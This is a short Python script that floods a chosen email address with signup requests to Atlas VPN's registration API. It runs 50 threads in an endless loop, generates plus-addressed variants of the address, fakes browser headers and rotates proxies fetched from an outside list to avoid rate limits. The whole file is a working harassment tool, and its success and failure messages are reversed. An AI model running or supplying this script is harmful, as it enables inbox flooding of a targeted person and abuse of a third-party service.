import requests
import random
import threading

def send_requests(email, thread_num):
    at_index = email.index('@')
    part1 = email[:at_index]
    part2 = email[at_index:]
    i = 0
    proxy_index = 0
    proxies = requests.get('https://cdn.droplets.cf/http-proxies.txt').text.strip().split('\n')
    while True:
        mail = f"{part1}+{random.randint(1, 30000)}{part2}"
        if i % 50 == 0:
            proxy_index = random.randint(0, len(proxies)-1)
        proxy = {'http': proxies[proxy_index], 'https': proxies[proxy_index]}
        try:
            response = requests.post('https://user.atlasvpn.com/v1/request/join', headers={
                'authority': 'user.atlasvpn.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://account.atlasvpn.com',
                'referer': 'https://account.atlasvpn.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'x-client-id': 'Web'
            }, json={
                'email': mail,
                'marketing_consent': True
            }, proxies=proxy)
            if response.status_code == 200:
                print(f"[{thread_num}:{i}] Failed to send request for {mail}. Status code: {response.status_code}")
            else:
                print(f"[Thread: {thread_num}  Email:{i}] Successfully sent email.")
        except:
            print(f"[Thread: {thread_num}  Email:{i}] Failed to send email using proxy: {proxy}")
        i += 1

def main():
    email = input("Enter email: ")
    threads = []
    for i in range(50):
        t = threading.Thread(target=send_requests, args=(email, i))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
